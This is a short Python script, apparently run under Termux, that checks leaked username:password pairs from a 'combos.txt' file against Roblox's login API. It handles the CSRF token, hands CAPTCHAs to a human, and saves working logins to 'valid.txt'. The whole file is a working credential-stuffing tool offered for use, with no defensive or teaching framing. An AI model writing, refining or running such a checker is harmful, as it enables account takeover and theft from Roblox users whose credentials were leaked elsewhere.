import os
import requests
import json

# Roblox login API
login_url = 'https://auth.roblox.com/v1/login'

# HTTP headers
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/json'
}

# Open Roblox login page if CAPTCHA detected
def handle_captcha():
    print("\n[!] CAPTCHA detected. Opening Roblox login page...")
    os.system("termux-open-url https://www.roblox.com/login")
    input("[!] After solving the CAPTCHA, press Enter to continue...")

# Try to log in using credentials
def try_login(username, password):
    session = requests.Session()
    session.headers.update(headers)

    payload = {
        "username": username,
        "password": password
    }

    # Get CSRF token
    res = session.post(login_url, json=payload)
    if res.status_code == 403 and "x-csrf-token" in res.headers:
        session.headers["x-csrf-token"] = res.headers["x-csrf-token"]
        res = session.post(login_url, json=payload)

    # Handle CAPTCHA or block
    try:
        response_json = res.json()
        if "captcha" in res.text.lower() or "captchaurl" in res.text.lower():
            print("[!] CAPTCHA detected in response.")
            handle_captcha()
            return False
    except json.JSONDecodeError:
        print("[!] Invalid JSON response. Possible block or IP error.")
        return False

    # Login result
    if res.status_code == 200 and 'errors' not in res.json():
        print(f"[+] SUCCESS: {username}:{password}")
        with open("valid.txt", "a") as valid_file:
            valid_file.write(f"{username}:{password}\n")
        return True
    else:
        print(f"[-] FAILED: {username}:{password}")
        return False

# Read from combos.txt and attempt login
def check_credentials(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if ':' not in line:
                    continue
                username, password = line.split(':', 1)
                print(f"\n[*] Trying: {username}:{password}")
                try_login(username, password)
    except FileNotFoundError:
        print("[!] File not found:", file_path)
    except Exception as e:
        print("[!] Error reading file:", str(e))

# Start checking credentials from combos.txt
check_credentials('combos.txt')
